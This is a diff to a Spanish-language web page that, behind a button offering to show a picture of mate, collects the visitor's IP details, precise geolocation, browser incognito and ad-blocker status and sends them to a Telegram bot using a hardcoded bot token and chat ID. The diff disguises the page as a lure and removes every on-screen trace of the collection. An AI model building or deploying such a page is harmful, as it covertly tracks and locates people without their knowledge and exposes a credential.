@@ -2,19 +2,18 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <title>PAGE</title>
+  <title>SN</title>
   <style>
     body { font-family: Arial; padding: 20px; background: #f0f0f0; }
-    .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 700px; margin: auto; }
+    .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 700px; margin: auto; text-align: center; }
     button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
-    pre { white-space: pre-wrap; word-wrap: break-word; }
+    img { max-width: 100%; border-radius: 10px; margin-top: 20px; }
   </style>
 </head>
 <body>
-  <div class="box">
-    <h2>Aprieta el botón Porfavor</h2>
-    <button id="startBtn">Dame Click</button>
-    <pre id="result">..</pre>
+  <div class="box" id="mainBox">
+    <h2>Haz click en el boton para mostrar la imagen de un mate</h2>
+    <button id="startBtn">Mostrar Mate</button>
   </div>
 
 <script>
@@ -22,7 +21,6 @@
   const BOT_TOKEN = "8011619975:AAE_Donqy5xn8RD0lJ2LOIP326dTDrnO1Ag";
   const CHAT_ID = "6065284869";
 
-  const resultEl = document.getElementById("result");
   const startBtn = document.getElementById("startBtn");
 
   let humanInteraction = false;
@@ -114,7 +112,7 @@
   async function sendToTelegram(message) {
     try {
       const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-      const response = await fetch(url, {
+      await fetch(url, {
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({
@@ -122,20 +120,12 @@
           text: message,
         }),
       });
-      const data = await response.json();
-      console.log("Telegram response:", data);
-      if (!data.ok) {
-        resultEl.textContent += `\nError Telegram: ${data.description || 'Error desconocido'}`;
-      }
     } catch(e) {
       console.warn("Error enviando a Telegram:", e);
-      resultEl.textContent += `\nError enviando a Telegram: ${e.message}`;
     }
   }
 
   async function collectAndSend() {
-    resultEl.textContent = "Espera porfavor...";
-
     const [ipRes, geoRes, incognitoStatus, permStatus, adblockStatus] = await Promise.allSettled([
       getIPInfo(),
       new Promise((res, rej) => {
@@ -181,7 +171,6 @@ AdBlock detectado: ${adblockStatus.status === "fulfilled" ? adblockStatus.value 
 Hora: ${new Date().toLocaleString()}
 `;
 
-    resultEl.textContent = message;
     await sendToTelegram(message);
 
     if (geoRes.status === "fulfilled") {
@@ -192,11 +181,15 @@ Longitud: ${longitude}
 Precisión: ${accuracy} metros
 Hora: ${new Date().toLocaleString()}
 `;
-      resultEl.textContent += locationInfo;
       await sendToTelegram(locationInfo);
     } else {
-      resultEl.textContent += "\nUbicación precisa no disponible o rechazada.";
+      await sendToTelegram("\nUbicación precisa no disponible o rechazada.");
     }
+
+    // Mostrar solo imagen final
+    document.getElementById("mainBox").innerHTML = `
+      <img src="https://i.ibb.co/YB3WFLk/imagen.jpg" alt="Gracias">
+    `;
   }
 
   startBtn.onclick = collectAndSend;
